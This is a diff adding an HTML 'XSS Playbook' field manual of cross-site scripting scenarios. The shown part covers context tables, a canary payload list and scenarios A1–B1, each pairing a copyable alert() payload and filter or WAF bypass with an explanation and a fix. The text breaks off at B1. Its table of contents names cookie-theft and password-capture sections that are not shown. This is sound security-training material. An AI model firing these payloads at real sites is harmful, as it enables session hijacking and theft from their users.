@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Playbook — Cross-Site Scripting Field Manual</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,600;12..96,700;12..96,800&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0b101b;--bg2:#0f1626;--panel:#131c2e;--panel2:#1a2742;
+  --line:#22304b;--line2:#33486f;
+  --text:#e8eef8;--muted:#94a5c0;--faint:#5d7095;
+  --amber:#ffb454;--coral:#ff6d6d;--mint:#43e0ad;--blue:#6cb8ff;--pink:#f09ad9;
+  --mono:'IBM Plex Mono',monospace;--disp:'Bricolage Grotesque',sans-serif;--body:'IBM Plex Sans',sans-serif;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font:400 15.5px/1.65 var(--body)}
+body::before{content:"";position:fixed;inset:0;z-index:-2;background:
+  radial-gradient(1000px 520px at 88% -8%,rgba(67,224,173,.07),transparent 60%),
+  radial-gradient(900px 640px at -12% 18%,rgba(255,180,84,.09),transparent 55%),
+  radial-gradient(820px 560px at 55% 112%,rgba(108,184,255,.07),transparent 60%)}
+body::after{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.55;background:
+  linear-gradient(rgba(125,155,205,.05) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(125,155,205,.05) 1px,transparent 1px);
+  background-size:46px 46px;
+  -webkit-mask-image:radial-gradient(ellipse at 50% -10%,#000 30%,transparent 78%);
+  mask-image:radial-gradient(ellipse at 50% -10%,#000 30%,transparent 78%)}
+::selection{background:rgba(255,180,84,.3)}
+#progress{position:fixed;top:0;left:0;height:3px;width:0;background:linear-gradient(90deg,var(--amber),var(--coral));z-index:99}
+
+/* ---------- payload ticker ---------- */
+.ticker{overflow:hidden;background:#080d16;border-bottom:1px solid var(--line);font:500 11.5px/1 var(--mono);color:var(--faint)}
+.ticker-track{display:inline-flex;gap:3rem;white-space:nowrap;padding:10px 0;animation:tick 70s linear infinite}
+.ticker:hover .ticker-track{animation-play-state:paused}
+.ticker-track b{color:var(--amber);font-weight:500}
+@keyframes tick{to{transform:translateX(-50%)}}
+
+/* ---------- masthead ---------- */
+.hazard{height:8px;background:repeating-linear-gradient(-45deg,var(--amber) 0 14px,#141b2b 14px 28px)}
+.masthead{max-width:1300px;margin:0 auto;padding:3.2rem 1.8rem 2rem;display:grid;grid-template-columns:1.5fr .9fr;gap:2.6rem;align-items:end}
+.kicker{font:600 11px var(--mono);letter-spacing:.28em;color:var(--amber);text-transform:uppercase;display:flex;align-items:center;gap:.7rem}
+.kicker::before{content:"";width:34px;height:2px;background:var(--amber)}
+h1{font:800 clamp(3rem,7.5vw,5.4rem)/.95 var(--disp);letter-spacing:-.02em;margin:.9rem 0 1rem}
+h1 .ghost{color:transparent;-webkit-text-stroke:2px rgba(255,180,84,.7)}
+.lede{color:var(--muted);max-width:58ch;font-size:1.02rem}
+.legal{margin-top:1.1rem;font:500 11px var(--mono);color:var(--coral);border:1px dashed rgba(255,109,109,.45);display:inline-block;padding:.45rem .8rem;border-radius:6px;letter-spacing:.06em}
+.stats{border:1px solid var(--line);background:linear-gradient(180deg,var(--panel),var(--bg2));border-radius:12px;padding:1.3rem;display:grid;grid-template-columns:1fr 1fr;gap:1.2rem}
+.stat b{font:800 1.9rem/1 var(--disp);display:block}
+.stat span{font:500 10px var(--mono);letter-spacing:.18em;color:var(--muted);text-transform:uppercase}
+.stat:nth-child(1) b{color:var(--amber)}.stat:nth-child(2) b{color:var(--coral)}
+.stat:nth-child(3) b{color:var(--mint)}.stat:nth-child(4) b{color:var(--blue)}
+
+/* ---------- kill chain ---------- */
+.chain{max-width:1300px;margin:0 auto 2.6rem;padding:0 1.8rem;display:flex;gap:.7rem;flex-wrap:wrap}
+.step{flex:1;min-width:155px;border:1px solid var(--line);border-radius:10px;padding:.85rem .95rem;background:var(--bg2);position:relative;transition:.25s}
+.step:hover{border-color:var(--amber);transform:translateY(-3px)}
+.step i{font:600 10px var(--mono);color:var(--faint);font-style:normal;letter-spacing:.2em}
+.step b{display:block;font:700 .95rem var(--disp);margin:.3rem 0 .15rem}
+.step p{font-size:.78rem;color:var(--muted)}
+.step::after{content:"→";position:absolute;right:-15px;top:50%;transform:translateY(-50%);color:var(--faint);z-index:2}
+.step:last-child::after{content:""}
+
+/* ---------- layout / toc ---------- */
+.layout{max-width:1300px;margin:0 auto;padding:0 1.8rem 3rem;display:grid;grid-template-columns:264px minmax(0,1fr);gap:2.6rem}
+.toc{position:sticky;top:14px;align-self:start;max-height:calc(100vh - 28px);overflow:auto;border:1px solid var(--line);border-radius:12px;background:var(--bg2);padding:1rem}
+#search{width:100%;background:#0a0f1a;border:1px solid var(--line);color:var(--text);border-radius:8px;padding:.5rem .7rem;font:400 12.5px var(--mono);margin-bottom:.7rem}
+#search:focus{outline:none;border-color:var(--amber)}
+.chips{display:flex;flex-wrap:wrap;gap:.35rem;margin-bottom:.6rem}
+.chip{font:600 9.5px var(--mono);letter-spacing:.08em;padding:.32rem .55rem;border-radius:99px;border:1px solid var(--line);color:var(--muted);cursor:pointer;transition:.15s;background:transparent;text-transform:uppercase}
+.chip:hover{border-color:var(--line2);color:var(--text)}
+.chip.on{background:var(--amber);border-color:var(--amber);color:#171006}
+#count{font:500 10px var(--mono);color:var(--faint);letter-spacing:.1em;display:block;margin-bottom:.6rem}
+.toc h5{font:600 10px var(--mono);letter-spacing:.22em;color:var(--faint);text-transform:uppercase;margin:1rem .2rem .35rem}
+.toc a{display:block;font-size:.8rem;color:var(--muted);text-decoration:none;padding:.22rem .5rem;border-left:2px solid transparent;border-radius:0 6px 6px 0;transition:.15s}
+.toc a:hover{color:var(--text);background:rgba(255,255,255,.04)}
+.toc a.active{color:var(--amber);border-left-color:var(--amber);background:rgba(255,180,84,.07)}
+.toc .grp{font-weight:600;color:var(--text)}
+
+/* ---------- sections ---------- */
+.sec-head{display:flex;align-items:baseline;gap:1.1rem;margin:3.4rem 0 1.2rem;border-bottom:2px solid var(--line);padding-bottom:.7rem;flex-wrap:wrap}
+.sec-num{font:800 2.6rem/1 var(--disp);color:transparent;-webkit-text-stroke:1.5px var(--faint)}
+.sec-head h2{font:800 clamp(1.45rem,3vw,2.05rem)/1.1 var(--disp);letter-spacing:-.01em}
+.sec-head .tag{margin-left:auto;font:600 10px var(--mono);letter-spacing:.2em;color:var(--faint);text-transform:uppercase}
+.note{color:var(--muted);font-size:.9rem;max-width:75ch;margin-bottom:1.2rem}
+.note b{color:var(--text)}
+
+/* ---------- scenario cards ---------- */
+.scn{--cat:var(--amber);position:relative;background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-left:3px solid var(--cat);border-radius:10px;margin:1rem 0;padding:1.15rem 1.3rem;scroll-margin-top:20px;transition:transform .25s,border-color .25s,box-shadow .25s,opacity .5s;opacity:0;transform:translateY(14px)}
+.scn.in{opacity:1;transform:none}
+.scn.in:hover{border-color:var(--line2);box-shadow:0 14px 34px rgba(0,0,0,.4);transform:translateY(-2px)}
+.t-stored{--cat:var(--coral)}.t-dom{--cat:var(--mint)}.t-evasion{--cat:var(--pink)}.t-weapon{--cat:var(--blue)}
+.scn header{display:flex;align-items:center;gap:.6rem;flex-wrap:wrap;margin-bottom:.35rem}
+.sid{font:700 11px var(--mono);color:var(--cat);border:1px solid var(--cat);border-radius:6px;padding:.18rem .45rem;letter-spacing:.05em}
+.badge{font:700 9.5px var(--mono);letter-spacing:.14em;padding:.26rem .55rem;border-radius:4px;text-transform:uppercase}
+.b-reflected{color:var(--amber);background:rgba(255,180,84,.12)}
+.b-stored{color:var(--coral);background:rgba(255,109,109,.12)}
+.b-dom{color:var(--mint);background:rgba(67,224,173,.12)}
+.b-evasion{color:var(--pink);background:rgba(240,154,217,.12)}
+.b-weapon{color:var(--blue);background:rgba(108,184,255,.12)}
+.ctx,.trig{font:500 9.5px var(--mono);letter-spacing:.1em;color:var(--faint);border:1px solid var(--line);padding:.24rem .5rem;border-radius:4px;text-transform:uppercase}
+.trig{color:var(--muted)}
+.scn h3{font:700 1.12rem/1.3 var(--disp);flex-basis:100%;margin-top:.35rem}
+.scn-grid{display:grid;grid-template-columns:minmax(0,.9fr) minmax(0,1.1fr);gap:1rem 1.5rem;margin-top:.85rem}
+.scn-grid h4{font:600 9.5px var(--mono);letter-spacing:.22em;text-transform:uppercase;color:var(--faint);margin-bottom:.4rem;display:flex;align-items:center;gap:.5rem}
+.scn-grid h4::before{content:"▸";color:var(--cat)}
+.scn p{font-size:.86rem;color:var(--muted)}
+.scn p b{color:var(--text);font-weight:600}
+.codebox{position:relative}
+pre{background:#080d16;border:1px solid var(--line);border-radius:8px;padding:.8rem .95rem;overflow:auto;font:400 12.5px/1.6 var(--mono);color:#cfe0f5}
+.copy{position:absolute;top:1.9rem;right:.5rem;font:600 9.5px var(--mono);letter-spacing:.1em;background:var(--panel2);color:var(--muted);border:1px solid var(--line2);border-radius:6px;padding:.3rem .55rem;cursor:pointer;transition:.15s;text-transform:uppercase;z-index:2}
+.copy:hover{color:var(--amber);border-color:var(--amber)}
+.copy.ok{color:var(--mint);border-color:var(--mint)}
+.whyfix{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;grid-column:1/-1;border-top:1px dashed var(--line);padding-top:.85rem}
+
+/* ---------- tables ---------- */
+.tblwrap{overflow-x:auto;border:1px solid var(--line);border-radius:10px;background:var(--bg2);margin-bottom:1.4rem}
+table{width:100%;border-collapse:collapse;font-size:.85rem;min-width:620px}
+th{font:600 10px var(--mono);letter-spacing:.16em;text-transform:uppercase;color:var(--muted);text-align:left;padding:.7rem .9rem;background:var(--panel);border-bottom:2px solid var(--line2)}
+td{padding:.6rem .9rem;border-bottom:1px solid var(--line);vertical-align:top;color:var(--muted)}
+tr:last-child td{border-bottom:0}
+tbody tr{transition:.15s}
+tbody tr:hover td{background:rgba(255,255,255,.025);color:var(--text)}
+td code,p code,li code{font-size:.82em;font-family:var(--mono);background:rgba(108,184,255,.09);color:#a8d4ff;padding:.12em .35em;border-radius:4px;white-space:nowrap}
+
+/* ---------- canaries / checklist / defense ---------- */
+.canaries{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:.6rem;margin-bottom:1.2rem}
+.canaries pre{padding:.6rem .8rem;font-size:12px;transition:.2s}
+.canaries pre:hover{border-color:var(--amber);transform:translateX(3px)}
+.check{counter-reset:c;display:grid;gap:.55rem;margin-bottom:1.4rem}
+.check li{list-style:none;counter-increment:c;display:flex;gap:.9rem;align-items:flex-start;border:1px solid var(--line);border-radius:8px;padding:.7rem .9rem;background:var(--bg2);transition:.2s}
+.check li:hover{border-color:var(--mint);transform:translateX(4px)}
+.check li::before{content:counter(c,decimal-leading-zero);font:700 12px var(--mono);color:var(--mint);border:1px solid rgba(67,224,173,.4);border-radius:6px;padding:.22rem .45rem;min-width:2.4em;text-align:center;flex-shrink:0}
+.check b{color:var(--text)}
+.check span{font-size:.85rem;color:var(--muted)}
+.defgrid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.defcard{border:1px solid var(--line);border-radius:10px;padding:1.1rem 1.2rem;background:linear-gradient(180deg,var(--panel),var(--bg2));transition:.25s}
+.defcard:hover{border-color:var(--line2);transform:translateY(-3px)}
+.defcard h4{font:700 1rem var(--disp);margin-bottom:.45rem;display:flex;gap:.55rem;align-items:center}
+.defcard h4 span{font:700 10px var(--mono);color:var(--mint);border:1px solid rgba(67,224,173,.4);border-radius:5px;padding:.12rem .4rem}
+.defcard p{font-size:.85rem;color:var(--muted);margin-bottom:.6rem}
+.defcard pre{font-size:11.5px}
+
+/* ---------- footer / misc ---------- */
+footer{border-top:1px solid var(--line);background:#080d16}
+.foot{max-width:1300px;margin:0 auto;padding:2.4rem 1.8rem;display:grid;grid-template-columns:1.2fr 1fr;gap:2.4rem;color:var(--muted);font-size:.85rem}
+.foot h5{font:600 10px var(--mono);letter-spacing:.22em;color:var(--faint);text-transform:uppercase;margin-bottom:.6rem}
+.foot li{margin:.3rem 0;list-style:none}
+.foot a{color:var(--blue);text-decoration:none}
+.foot a:hover{text-decoration:underline}
+#toTop{position:fixed;right:22px;bottom:22px;width:44px;height:44px;border-radius:10px;border:1px solid var(--line2);background:var(--panel);color:var(--amber);font-size:17px;cursor:pointer;opacity:0;pointer-events:none;transition:.25s;z-index:50}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{transform:translateY(-3px);border-color:var(--amber)}
+.rv{opacity:0;transform:translateY(16px);transition:opacity .5s,transform .5s}
+.rv.in{opacity:1;transform:none}
+@media(max-width:1080px){
+  .layout{grid-template-columns:1fr}.toc{position:static;max-height:none}
+  .scn-grid,.whyfix,.masthead,.defgrid,.foot{grid-template-columns:1fr}
+  .step::after{display:none}
+}
+@media print{
+  .ticker,#toTop,.toc,#progress,.copy,.chips,#search{display:none}
+  .scn,.rv{break-inside:avoid;opacity:1;transform:none}
+  .layout{display:block}body{background:#fff}
+}
+</style>
+<noscript><style>.scn,.rv{opacity:1;transform:none}</style></noscript>
+</head>
+<body>
+<div id="progress"></div>
+
+<div class="ticker" aria-hidden="true"><div class="ticker-track" id="tick">
+  <span><b>&lt;script&gt;</b>alert(1)<b>&lt;/script&gt;</b></span><span>◆</span>
+  <span><b>"&gt;</b>&lt;img src=x onerror=alert(1)&gt;</span><span>◆</span>
+  <span><b>'</b>-alert(1)-<b>'</b></span><span>◆</span>
+  <span><b>${</b>alert(1)<b>}</b></span><span>◆</span>
+  <span><b>{{</b>constructor.constructor('alert(1)')()<b>}}</b></span><span>◆</span>
+  <span>javascript:alert<b>`1`</b></span><span>◆</span>
+  <span>&lt;svg&gt;&lt;animate <b>onbegin</b>=alert(1)&gt;</span><span>◆</span>
+  <span>&lt;customtag <b>autofocus onfocus</b>=alert(1)&gt;</span><span>◆</span>
+  <span><b>\'</b>-alert(1)<b>//</b></span><span>◆</span>
+  <span><b>&amp;apos;</b>-alert(1)-<b>&amp;apos;</b></span><span>◆</span>
+</div></div>
+
+<div class="hazard"></div>
+
+<header class="masthead">
+  <div>
+    <div class="kicker">Field Manual · Web Offensive Series · FM-XSS-26</div>
+    <h1>XSS <span class="ghost">PLAYBOOK</span></h1>
+    <p class="lede">Twenty-nine cross-site scripting scenarios — from a bare unencoded reflection to strict-CSP dangling-markup exfiltration. Each entry: the situation, the working payload, the mechanic that makes it fire, and the fix that kills it. Plus the context map, the encoding ladder, DOM source/sink tables, and weaponization chains.</p>
+    <div class="legal">⚠ AUTHORIZED SECURITY TESTING &amp; DEFENSE ONLY</div>
+  </div>
+  <div class="stats">
+    <div class="stat"><b>29</b><span>Scenarios</span></div>
+    <div class="stat"><b>05</b><span>Tactic groups</span></div>
+    <div class="stat"><b>09</b><span>Injection contexts</span></div>
+    <div class="stat"><b>2.0</b><span>Rev · Jul 2026</span></div>
+  </div>
+</header>
+
+<nav class="chain">
+  <div class="step"><i>PHASE 01</i><b>Locate</b><p>Every param, header, path, fragment, stored field.</p></div>
+  <div class="step"><i>PHASE 02</i><b>Context</b><p>Where does it land — body, attribute, JS, URL, expression?</p></div>
+  <div class="step"><i>PHASE 03</i><b>Break out</b><p>What's encoded, escaped, or blocked? What isn't?</p></div>
+  <div class="step"><i>PHASE 04</i><b>Execute</b><p>Minimal payload for that context. Confirm the alert.</p></div>
+  <div class="step"><i>PHASE 05</i><b>Escalate</b><p>Cookies → credentials → CSRF chain → takeover.</p></div>
+</nav>
+
+<div class="layout">
+
+<aside class="toc">
+  <input id="search" type="search" placeholder="grep scenarios…" aria-label="Search scenarios">
+  <div class="chips">
+    <button class="chip on" data-f="all">All</button>
+    <button class="chip" data-f="reflected">Refl</button>
+    <button class="chip" data-f="stored">Stored</button>
+    <button class="chip" data-f="dom">DOM</button>
+    <button class="chip" data-f="evasion">Evasion</button>
+    <button class="chip" data-f="weapon">Weapon</button>
+  </div>
+  <span id="count"></span>
+  <a class="grp" href="#fundamentals">00 · Fundamentals</a>
+  <h5>01 · HTML Context</h5>
+  <a href="#a1">A1 · nothing encoded</a><a href="#a2">A2 · stored, nothing encoded</a>
+  <a href="#a3">A3 · most tags blocked</a><a href="#a4">A4 · only custom tags</a>
+  <a href="#a5">A5 · some SVG allowed</a><a href="#a6">A6 · canonical link tag</a>
+  <h5>02 · Attribute &amp; JS</h5>
+  <a href="#b1">B1 · attribute, &lt;&gt; encoded</a><a href="#b2">B2 · href, &quot; encoded</a>
+  <a href="#b3">B3 · JS string, &lt;&gt; encoded</a><a href="#b4">B4 · JS string, ' and \ escaped</a>
+  <a href="#b5">B5 · JS string, triple defense</a><a href="#b6">B6 · onclick, quad defense</a>
+  <a href="#b7">B7 · template literal</a>
+  <h5>03 · DOM-Based</h5>
+  <a href="#c1">C1 · document.write</a><a href="#c2">C2 · innerHTML</a>
+  <a href="#c3">C3 · jQuery selector</a><a href="#c4">C4 · write inside select</a>
+  <a href="#c5">C5 · AngularJS expression</a><a href="#c6">C6 · reflected DOM</a><a href="#c7">C7 · stored DOM</a>
+  <h5>04 · Filter &amp; CSP Evasion</h5>
+  <a href="#d1">D1 · events + href blocked</a><a href="#d2">D2 · JS URL, chars blocked</a>
+  <a href="#d3">D3 · sandbox escape, no strings</a><a href="#d4">D4 · sandbox escape + CSP</a>
+  <a href="#d5">D5 · strict CSP → dangling markup</a><a href="#d6">D6 · CSP bypass via JSONP</a>
+  <h5>05 · Weaponization</h5>
+  <a href="#e1">E1 · steal cookies</a><a href="#e2">E2 · capture passwords</a><a href="#e3">E3 · bypass CSRF</a>
+  <a class="grp" href="#domref">06 · Sources &amp; Sinks</a>
+  <a class="grp" href="#defense">07 · Defense</a>
+  <a class="grp" href="#workflow">08 · Engagement Workflow</a>
+</aside>
+
+<main>
+
+<!-- ============ 00 FUNDAMENTALS ============ -->
+<section id="fundamentals">
+  <div class="sec-head rv"><span class="sec-num">00</span><h2>Fundamentals — Context Is Everything</h2><span class="tag">read first</span></div>
+  <p class="note rv">XSS is one bug with many shapes. Before touching a payload, answer two questions: <b>which context does my input land in</b>, and <b>which characters survive</b>. The context decides the breakout; the surviving characters decide the payload.</p>
+
+  <div class="tblwrap rv"><table>
+    <tr><th>Reflection lands in…</th><th>You control</th><th>Probe</th><th>Strategy</th></tr>
+    <tr><td>HTML body</td><td>raw markup</td><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td><td>inject any tag with an event</td></tr>
+    <tr><td>Double-quoted attribute</td><td>attribute boundary</td><td><code>" onmouseover="alert(1)</code></td><td>new attribute or new tag</td></tr>
+    <tr><td>Single-quoted attribute</td><td>attribute boundary</td><td><code>' onmouseover='alert(1)</code></td><td>same, other quote</td></tr>
+    <tr><td>Unquoted attribute</td><td>whitespace</td><td><code>autofocus onfocus=alert(1) x=</code></td><td>space terminates the value</td></tr>
+    <tr><td>JS string in script block</td><td>string boundary</td><td><code>'-alert(1)-'</code></td><td>stay in JS, or <code>&lt;/script&gt;</code> out</td></tr>
+    <tr><td>Template literal</td><td>interpolation</td><td><code>${7*7}</code> → 49</td><td><code>${alert(1)}</code>, no breakout needed</td></tr>
+    <tr><td>href / src / action</td><td>the URL</td><td><code>javascript:alert(1)</code></td><td>pseudo-protocol navigation</td></tr>
+    <tr><td>Angular / Vue expression</td><td>the expression</td><td><code>{{7*7}}</code> → 49</td><td>prototype-chain to <code>Function</code></td></tr>
+    <tr><td>JSON → client-side sink</td><td>data, re-parsed later</td><td>trace to <code>innerHTML</code></td><td>DOM XSS at the render layer</td></tr>
+  </table></div>
+
+  <div class="tblwrap rv"><table>
+    <tr><th>What the app does</th><th>Counter-move</th></tr>
+    <tr><td>Nothing encoded</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+    <tr><td><code>&lt; &gt;</code> HTML-encoded</td><td>break out of the attribute (<code>"</code>) or JS string (<code>'</code>) instead</td></tr>
+    <tr><td><code>"</code> encoded, <code>'</code> raw</td><td>single-quote breakout; <code>javascript:</code> in URL attrs</td></tr>
+    <tr><td><code>'</code> and <code>\</code> escaped in JS string</td><td>close the script block with <code>&lt;/script&gt;</code> if brackets are raw (B4)</td></tr>
+    <tr><td><code>&lt;&gt;</code> + <code>"</code> encoded, <code>'</code> escaped</td><td>inject your own <code>\</code> to consume their escape (B5)</td></tr>
+    <tr><td>quotes + backslash escaped inside an <b>event attribute</b></td><td>HTML entities <code>&amp;apos;</code> / <code>&amp;#39;</code> — decoded before JS ever sees them (B6)</td></tr>
+    <tr><td>everything unicode-escaped in a template literal</td><td><code>${…}</code> interpolation — <code>$</code>, <code>{</code>, <code>}</code> aren't escaped (B7)</td></tr>
+    <tr><td>tag allowlist</td><td>fuzz it; custom tags, <code>svg/animate</code>, <code>body+onresize</code> (A3–A5)</td></tr>
+    <tr><td>all <code>on*</code> events blocked</td><td><code>formaction</code>, <code>action</code>, <code>srcdoc</code>, <code>meta refresh</code> (D1)</td></tr>
+    <tr><td><code>javascript:</code> blocked in href</td><td><code>formaction</code>, <code>iframe srcdoc</code>, <code>object data</code></td></tr>
+    <tr><td>strict CSP</td><td>JSONP gadget, dangling markup, framework expressions (D4–D6)</td></tr>
+  </table></div>
+
+  <h4 style="font:600 10px var(--mono);letter-spacing:.22em;color:var(--faint);margin:1.4rem 0 .7rem">▸ CANARY ARSENAL — FIRST EIGHT REQUESTS</h4>
+  <div class="canaries rv">
+    <pre>&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+    <pre>"&gt;&lt;img src=x onerror=alert(1)&gt;</pre>
+    <pre>'-alert(1)-'</pre>
+    <pre>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+    <pre>${7*7}</pre>
+    <pre>{{7*7}}</pre>
+    <pre>javascript:alert(1)</pre>
+    <pre>autofocus onfocus=alert(1) x=</pre>
+  </div>
+</section>
+
+<!-- ============ 01 HTML CONTEXT ============ -->
+<section id="html-context">
+  <div class="sec-head rv"><span class="sec-num">01</span><h2>HTML Context — Server-Rendered Injection</h2><span class="tag">A1 – A6</span></div>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into html context with nothing encoded" id="a1">
+    <header><span class="sid">A1</span><span class="badge b-reflected">Reflected</span><span class="ctx">HTML body</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS into HTML context with nothing encoded</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The search term is echoed straight into the results page body. No output encoding anywhere — the baseline case. Always probe every parameter with this first; if it reflects raw, you're done.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>?search=&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Reflection lands in HTML body context; the browser parses the injected <code>&lt;script&gt;</code> as part of the page and executes it.</p></div>
+        <div><h4>Fix</h4><p>HTML-entity encode all dynamic values in body context (<code>&lt;</code> → <code>&amp;lt;</code>).</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-stored" data-type="stored" data-title="stored xss into html context with nothing encoded" id="a2">
+    <header><span class="sid">A2</span><span class="badge b-stored">Stored</span><span class="ctx">HTML body</span><span class="trig">⚡ auto</span>
+      <h3>Stored XSS into HTML context with nothing encoded</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The comment body is persisted and rendered into the blog post for <b>every visitor</b>, unencoded. Impact multiplies: one request from you, endless victims, zero interaction.</p></div>
+      <div class="codebox"><h4>Payload — comment field</h4><button class="copy">copy</button>
+        <pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Stored data re-enters the HTML body context unsanitized on every page view; no delivery link needed.</p></div>
+        <div><h4>Fix</h4><p>Encode at output; sanitize rich text with a strict allowlist parser (DOMPurify); <code>HttpOnly</code> on session cookies to blunt impact.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into html context with most tags and attributes blocked" id="a3">
+    <header><span class="sid">A3</span><span class="badge b-reflected">Reflected</span><span class="ctx">HTML body + WAF</span><span class="trig">⚡ auto via iframe</span>
+      <h3>Reflected XSS into HTML context with most tags and attributes blocked</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>A WAF strips most tags and attributes. <b>Fuzz the allowlist</b> (Intruder: <code>&lt;§tag§&gt;</code> across a tag list, then events per surviving tag). Here <code>body</code> + <code>onresize</code> survive.</p></div>
+      <div class="codebox"><h4>Payload + delivery</h4><button class="copy">copy</button>
+        <pre><code>?search=&lt;body onresize=alert(1)&gt;
+
+&lt;!-- deliver so it fires with no victim action --&gt;
+&lt;iframe src="https://TARGET/?search=%3Cbody%20onresize%3Dalert(1)%3E"
+        onload="this.width=100px"&gt;&lt;/iframe&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>body</code>/<code>onresize</code> pass the allowlist; resizing the iframe right after load fires the handler automatically.</p></div>
+        <div><h4>Fix</h4><p>Tag allowlists are brittle — encode output; use a real sanitizer for legitimate rich content.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into html context with all tags blocked except custom ones" id="a4">
+    <header><span class="sid">A4</span><span class="badge b-reflected">Reflected</span><span class="ctx">HTML body + WAF</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS into HTML context with all tags blocked except custom ones</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The filter blocks every <b>known</b> tag — but only known ones. Custom elements pass through and still parse as elements with full event support.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;customtag autofocus onfocus=alert(1)&gt;
+
+&lt;!-- fallback: --&gt;
+&lt;xss tabindex=1 onfocus=alert(1)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>A denylist keyed on existing tag names can't anticipate new ones; <code>autofocus</code> focuses the element at parse time, <code>onfocus</code> fires.</p></div>
+        <div><h4>Fix</h4><p>Deny-by-default parsing — encode, or sanitize with a library that drops unknown elements.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss with some svg markup allowed" id="a5">
+    <header><span class="sid">A5</span><span class="badge b-reflected">Reflected</span><span class="ctx">SVG markup</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS with some SVG markup allowed</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The sanitizer permits "some SVG." Fuzz which children survive — <code>animate</code> / <code>animatetransform</code> with <code>onbegin</code> is the classic surviving combo.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;
+
+&lt;!-- variant: --&gt;
+&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The animation starts the moment it parses; <code>onbegin</code> is an event handler riding in on "allowed" SVG.</p></div>
+        <div><h4>Fix</h4><p>Strip animation elements; run SVG through DOMPurify with a tight profile — or don't accept user SVG.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss in canonical link tag" id="a6">
+    <header><span class="sid">A6</span><span class="badge b-reflected">Reflected</span><span class="ctx">link href attr</span><span class="trig">⌨ access key</span>
+      <h3>Reflected XSS in canonical link tag</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Input reflects into <code>&lt;link rel="canonical" href="REFLECTED"&gt;</code>. Angle brackets are encoded, but single quotes aren't — and it's an attribute context.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>?/' accesskey='x' onclick='alert(1)
+
+&lt;!-- victim presses the access key:
+     Alt+X / Shift+Alt+X / Ctrl+Alt+X (browser-dependent) --&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>'</code> escapes <code>href</code>; <code>accesskey</code> binds a keystroke to a click on the invisible link → <code>onclick</code> runs.</p></div>
+        <div><h4>Fix</h4><p>Validate/normalize canonical URLs server-side; never reflect raw input into link attributes.</p></div>
+      </div>
+    </div>
+  </article>
+</section>
+
+<!-- ============ 02 ATTRIBUTE & JS ============ -->
+<section id="attr-js">
+  <div class="sec-head rv"><span class="sec-num">02</span><h2>Attribute &amp; JavaScript Contexts</h2><span class="tag">B1 – B7</span></div>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into attribute with angle brackets html encoded" id="b1">
+    <header><span class="sid">B1</span><span class="badge b-reflected">Reflected</span><span class="ctx">value attribute</span><span class="trig">🖱 hover</span>
+      <h3>Reflected XSS into attribute with angle brackets HTML-encoded</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Reflection inside <code>&lt;input … value="REFLECTED"&gt;</code>. <code>&lt; &gt;</code> are entity-encoded so you can't open a new tag — you don't need to. Stay inside the tag and break out of the attribute.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>" onmouseover="alert(document.domain)</code></pre></div>
+      <div class="whyfix">
